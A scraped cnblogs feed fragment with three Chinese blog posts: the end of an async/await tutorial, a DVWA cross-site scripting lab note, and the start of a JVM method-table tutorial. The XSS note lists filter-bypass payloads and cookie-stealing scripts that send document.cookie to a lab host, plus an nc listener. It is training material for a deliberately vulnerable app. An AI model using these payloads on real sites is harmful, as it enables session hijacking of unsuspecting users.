&lt;p&gt;多个await命令后面的异步操作，如果不存在继发关系，最好让它们同时触发,所谓的继发就是，不相互关联的异步操作，比如第一个异步的返回值给第二个异步这样的例子。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;function time(ms){
  return new Promise((resolve,reject)=&amp;gt;{
    setTimeout(function(){
      resolve()
    },ms)
  })
}
async function f() {
  try {
    let a = time(1000)
    let b = time(2000)
    await Promise.all([a,b]); // 不加Promise.all()的话，3s才实行完,加上Promise.all()的话，2s实行完
    console.log('~~~')
  } catch(e) {
    console.log('e',e) // 'e' 出错了
  }
}
f()&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;13&quot;&gt;
&lt;p&gt;await必须在async函数的上下文中的作用域中&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;//for 循环
async function a() {
    let arr = [1, 2, 3, 4, 5];
    for (let i = 0; i &amp;lt; arr.length; i ++) {
        await arr[i];
    }
}
a();
// forEach循环
async function b() {
  let arr = [1, 2, 3, 4, 5];
  arr.forEach(item =&amp;gt; {
      await item;
  });
}
b();// Uncaught SyntaxError: Unexpected identifier&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;原因就是forEach就是一个单独的作用域，会报错。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;总结&quot;&gt;6 总结&lt;/h5&gt;
&lt;p&gt;async-await函数就是为了简化异步操作的一种方式，大部分就是结合promise使用，离开不了promise，就像那个并发实行需要使用promise的方法。妥善使用async-await，会给自己对异步操作带来很大的便利，另外，感谢一位博主的文章，让我更快的理解async-await函数。&lt;br/&gt;如果本文有什么不对的地方，欢迎指出，谢谢，大家一起进步加油。我把笔记放到&lt;a href=&quot;https://github.com/sqh17/notes/blob/master/ways/async.md&quot;&gt;github&lt;/a&gt;了，如果满意的话给个star～&lt;/p&gt;
&lt;h5 id=&quot;参考文献&quot;&gt;参考文献&lt;/h5&gt;
</description>
<pubDate>Wed, 17 Apr 2019 16:28:00 +0000</pubDate>
<dc:creator>热爱前端的17号诶</dc:creator>
<og:description>1 前情摘要 前段时间时间进行项目开发，需求安排不是很合理，导致一直高强度的加班工作，这一个月不是常说的996，简直是936，还好熬过来了。在此期间不是刚学会了es6的promise，在项目有用到pr</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/sqh17/p/10727156.html</dc:identifier>
</item>
<item>
<title>DVWA-XSS学习笔记 - 雨中落叶</title>
<link>http://www.cnblogs.com/yuzly/p/10692449.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yuzly/p/10692449.html</guid>
<description>&lt;p&gt;&lt;span&gt;DVWA-XSS&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;XSS概念:由于web应用程序对用户的输入过滤不严,通过html注入篡改网页，插入恶意脚本，从而在用户浏览网页时,控制用户浏览器的一种攻击。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;XSS类型:&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;反射型XSS:只是简单地把用户输入的数据反射给浏览器,简单来说，黑客往往需要去诱使用户点击一个恶意链接，才能攻击成功。  &lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;存储型XSS:将用户输入的数据存储在服务器端，每次用户访问都会被执行js脚本。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;DOM型XSS:文本对象模式xss,通过修改页面的DOM节点形成的XSS，&lt;span&gt;可存储型，可反射型，只取决于输出地点。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;XSS的应用场景:1.利用xss获得cookie,2.重定向，3.钓鱼网站，4.DDOS&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;一、反射型XSS&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;span&gt;反射型XSS原理&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411201659763-947904709.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;(一)将DVWA的级别设置为low&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.1查看源代码,可以看到没有对参数做任何防御处理措施，直接输出&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202119436-277800635.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.2尝试一般的XSS攻击&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &amp;lt;script&amp;gt;alert(‘xss’)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202150198-1799965.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;body onload=alert('xss2')&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202212230-870506200.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert('xss3')&amp;gt;click1&amp;lt;/a&amp;gt;    #点击click1时弹出xss3&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202235874-258913149.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;img src=http://192.168.10.128/a.jpg onerror=alert('xss4')&amp;gt;  #src地址错误，然后执行onerror的内容&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202259250-2027788119.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;重定向:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;window.location='http://www.163.com'&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;iframe src='http://192.168.10.141/a.jpg' height='0' width='0'&amp;gt;&amp;lt;iframe&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202324015-1017772781.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;获取cookie&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; 　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202355293-97721967.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.&amp;lt;script&amp;gt;new Image().src=&quot;http://192.168.10.141/a.php?output=&quot;+document.cookie;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.1在192.168.10.141上开启监听&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Nc -nvlp 80&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.2在DVWA中输入如下内容&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;new Image().src=&quot;http://192.168.10.141/a.php?output=&quot;+document.cookie;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.3此时可以在192.168.10.141的主机上获得DVWA的cookie信息&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202429202-455270149.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.4加载远程的js脚本&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.4.1在远端服务器上制作一个js脚本&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202444359-1534449159.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.4.2搭建站点,把js脚本放入到站点中，开启web服务&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;/etc/init.d/apache2 start&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.4.3在js脚本中的192.168.10.141主机上开启监听,&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202502711-1982680231.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.4.4在DVWA中输入如下内容&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;script src='http://192.168.10.141/getcookie.js'&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.4.5在192.168.10.141查看js脚本实现的结果&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202530455-2223567.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;(二)将DVWA的级别设置为medium&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.分析源码，可以看到使用str_replace函数只对参数进行了简单的替换,过滤&amp;lt;script&amp;gt;,别的没有过滤,此时可以用大小写或者别的标签来绕过&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202631136-1373540079.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.绕过DVWA  medium防御&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.1大小写绕过&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;Script&amp;gt;alert('xxx')&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.2组合过滤条件绕过&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;alert('sss')&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.3尝试使用别的标签来绕过&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;body onload=alert('s')&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert('ss')&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert(/ss/)&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;#&amp;lt;script&amp;gt;alert('xx')&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;(三)将DVWA的级别设置为High&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 1.分析源码，可以看到，使用了preg_replace正则表达式函数，对参数进行过滤，查看源码可以看到对&amp;lt;script&amp;gt;标签进行了严格的过滤，但没有过滤别的标签，此时可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202831380-1897111686.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2. 尝试使用别的标签来绕过&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;body onload=alert('s')&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;img src=&quot;&quot; onerror=alert('xss')&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert('ss')&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert(/ss/)&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;(四)将DVWA的级别设置为Impossible&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.分析源码,可以看到使用htmlspecialchars函数对参数进行html实体转义，此时就无法利用XSS漏洞了&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202928854-1907254347.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411202936600-153558115.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;二、存储型XSS&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;存储型XSS攻击原理图:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203123217-753537818.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;(一)将DVWA的级别设置为low&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.分析源码,可以看到首先对两个参数使用trim函数过滤掉两边的空格,然后$message使用mysql_real_escape_string函数转义SQL语句中的特殊字符，使用&lt;code&gt;s&lt;/code&gt;tripslashes函数过滤掉”\”，对$name参数中使用mysql_real_escape_string函数转义SQL语句中的特殊字符&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203338106-1686645370.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.从上面的代码可以看到,没有防御XSS漏洞，只防御了SQL注入漏洞&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;尝试一般的XSS攻击&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在message栏中测试:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;alert('x')&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;body onload=alert('sss')&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;a href=http://www.baidu.com&amp;gt;clock&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert('xss')&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;重定向:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;window.location=’http://www.baidu.com’&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;window.location=’http://192.168.10.141’&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;iframe src='http://192.168.10.10.141/a.jpg' height='0' width='0'&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;获取cookie:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;new Image().src=&quot;http://192.168.10.141/c.php?output=&quot;+document.cookie;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.在DVWA message栏中设置字节长度,输入&amp;lt;script&amp;gt;new Image().src=&quot;http://192.168.10.141/c.php?output=&quot;+document.cookie;&amp;lt;/script&amp;gt;，然后再kali中开启监听,下图可可以看到获取到DVWA中的cookie信息&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203601145-1078516834.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.换一个浏览器访问192.168.10.130/DVWA中存储型XSS，下图可以看到成功获得cookie信息&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203751822-279522839.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3.加载远端服务器的js脚本&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;制作一个js脚本&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203828747-786510384.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;把js脚本放到web站点中,开启web服务&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在DVWA栏中输入&amp;lt;script src=http://192.168.10.143/getcookie.js&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在192.168.10.143主机上开启监听,当有用户访问DVWA中存储型xss页面时,就会把cookie信息发送到192.168.10.143主机上&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203851656-1836497980.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;4.修改长度的大小就可以绕过长度的限制了&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411203858270-1662657522.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;(二)将DVWA的级别设置为Medium&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.分析源代码,可以看到对$message参数做了很严格的过滤(进行html实体转义以及转义SQL语句中使用的特殊字符，杜绝了对$message关于xss的利用),但对$name参数做的过滤不严格,只是替换&amp;lt;script&amp;gt;以及转义SQL语句中使用的特殊字符,可以使用别的html标签对$name参数的防护进行绕过&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411204035574-546179836.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.绕过DVWA medium级别&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;Script&amp;gt;alert('x')&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;body onload=alert('xss')&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert('xss')&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;(三)将DVWA的级别设置为High&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.分析源码,可以看到相比较中级而言，高级对$nam参数多了对&amp;lt;script&amp;gt;严格的过滤,没有对别的标签做过滤,但可以通过别的html标签来进行绕过&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411204126955-6671362.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.绕过&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;body onload=alert('xss')&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;a href='' onclick=alert('xss')&amp;gt;click&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;(四)将DVWA的级别设置为Impossible&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.分析源码可以看到,对两个参数都做了html实体转义,无法利用xss&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411204223979-939951006.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;三、DOM型XSS&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;文本对象模型&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;可储存型，可反射型,取决于输出地点&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&amp;lt;script&amp;gt;var img=document.createElement('img');img.src='http://192.168.10.143:88/log?'+escape(document.cookie);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;1.在DVWA中反射型xss中输入&amp;lt;script&amp;gt;var img=document.createElement('img');img.src='http://192.168.10.143:88/log?'+escape(document.cookie);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.在192.168.10.143主机上开启监听,可以看到&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411204336733-377586324.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;3.在DVWA中存储型xss中输入&amp;lt;script&amp;gt;var img=document.createElement('img');img.src='http://192.168.10.143:88/log?'+escape(document.cookie);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;4. 在192.168.10.143主机上开启监听,可以看到&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201904/1592114-20190411204418396-644933470.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;



</description>
<pubDate>Wed, 17 Apr 2019 16:27:00 +0000</pubDate>
<dc:creator>雨中落叶</dc:creator>
<og:description>DVWA-XSS XSS概念:由于web应用程序对用户的输入过滤不严,通过html注入篡改网页，插入恶意脚本，从而在用户浏览网页时,控制用户浏览器的一种攻击。 XSS类型: 反射型XSS:只是简单地把</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yuzly/p/10692449.html</dc:identifier>
</item>
<item>
<title>【JVM虚拟机】(8)--深入理解Class中--方法、属性表集合 - 雨点的名字</title>
<link>http://www.cnblogs.com/qdhxhz/p/10727117.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qdhxhz/p/10727117.html</guid>
<description>&lt;center&gt;

&lt;/center&gt;
&lt;p&gt;之前有关class文件已经写了两篇博客：&lt;/p&gt;
&lt;p&gt;1、&lt;a href=&quot;https://www.cnblogs.com/qdhxhz/p/10646088.html&quot;&gt;【JVM虚拟机】(5)---深入理解JVM-Class中常量池&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2、&lt;a href=&quot;https://www.cnblogs.com/qdhxhz/p/10676337.html&quot;&gt;【JVM虚拟机】(6)---深入理解Class中访问标志、类索引、父类索引、接口索引&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3、&lt;a href=&quot;https://www.cnblogs.com/qdhxhz/p/10693324.html&quot;&gt;【JVM虚拟机】(7)---深入理解Class中-属性集合&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;那么这篇博客主要讲有关 &lt;strong&gt;方法表集合&lt;/strong&gt; 相关的理解和代码示例。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;方法表集合&lt;/code&gt;: 告知该方法是什么修饰符修饰？是否有方法值？返回类型是什么？方法名称，方法参数，还有就是方法内的一些信息。&lt;/p&gt;
&lt;h2 id=&quot;一方法集合概念&quot;&gt;&lt;span&gt;一、方法集合概念&lt;/span&gt;&lt;/h2&gt;
&lt;h4 id=&quot;概念&quot;&gt;1、概念&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;方法表集合&lt;/code&gt;：方法表集合和属性表集合其实很相似,都是由&lt;code&gt;一个计数器(方法)&lt;/code&gt;和&lt;code&gt;若干个方法表&lt;/code&gt;构成，只不过方法表的结构相对复杂很多。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;方法表的结构体&lt;/code&gt;：&lt;strong&gt;访问标志(access_flags)、名称索引(name_index)、描述索引(descriptor_index)、属性表(attribute_info)集合&lt;/strong&gt;组成。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;method_info {
                    u2 access_flags;
                    u2 name_index;
                    u2 descriptor_index;
                    u2 attributes_count;
                    attribute_info attributes[attributes_count];
             }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;1)、&lt;code&gt;访问标志&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不多说了,和属性中的其实差不多，只是有些修饰符不一样。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190417235540325-1150347478.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2）、&lt;code&gt;名称索引&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;就是指这个方法的名称。如：'public void getXX()'中，getXX就是名称索引。&lt;strong&gt;名称索引&lt;/strong&gt;占&lt;strong&gt;两个字节&lt;/strong&gt;，这个方法的名称以UTF-8格式的字符串存储在这个&lt;strong&gt;常量池项&lt;/strong&gt;中。&lt;/p&gt;
&lt;p&gt;3)、&lt;code&gt;描述索引&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;指这个方法的返回值,方法内参数信息。一个方法的描述包含若干个参数的数据类型和返回值的数据类型。&lt;/p&gt;
&lt;p&gt;4)、&lt;code&gt;属性表(attribute_info)集合&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;下面讲&lt;/p&gt;
&lt;h2 id=&quot;二属性表集合&quot;&gt;&lt;span&gt;二、属性表集合&lt;/span&gt;&lt;/h2&gt;
&lt;h4 id=&quot;概述&quot;&gt;1、概述&lt;/h4&gt;
&lt;p&gt;在Class文件、字段表、方法表都可以携带自己的属性表集合，用于描述某些场景专有的信息。&lt;br/&gt;在方法表中, 属性表集合记录了某个方法的一些属性信息，这些信息包括：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;这个方法的代码实现，即&lt;code&gt;方法的可执行的机器指令&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;这个方法声明的要&lt;code&gt;抛出的异常信息&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;这个方法是否&lt;code&gt;被@deprecated注解表示&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;这个方法是否是&lt;code&gt;编译器自动生成的&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;属性表（attribute_info）&lt;/strong&gt;结构体的一般结构如下所示：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1090617/201904/1090617-20190417235716144-1459133840.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;属性表占着非常大的一部分且定义了众多属性,上面只列举了4个,查看完成的:&lt;a href=&quot;https://www.cnblogs.com/lrh-xl/p/5351182.html&quot;&gt;JDK1.7版本中21项属性表集合简要介绍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下面介绍两个重要的属性&lt;/p&gt;
&lt;h4 id=&quot;code属性&quot;&gt;1、Code属性&lt;/h4&gt;
